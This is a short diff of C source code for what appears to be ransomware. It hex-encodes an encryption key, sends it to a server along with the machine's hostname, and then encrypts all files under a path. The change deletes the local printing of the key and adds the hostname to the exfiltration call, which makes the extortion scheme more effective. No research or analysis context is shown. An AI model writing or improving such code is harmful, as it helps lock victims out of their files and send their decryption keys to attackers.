@@ -133,8 +133,7 @@ int main()
     // Send key and IV to server
     // Encode in hexa
     encoded_key = encode_hex(key, KEY_SIZE);
-    printf("%s\n", encoded_key);
-    send_key(encoded_key);
+    send_key(encoded_key, get_hostname());
 
     // Encrypt
     apply_for_all(path, &encrypt_file, key, iv);
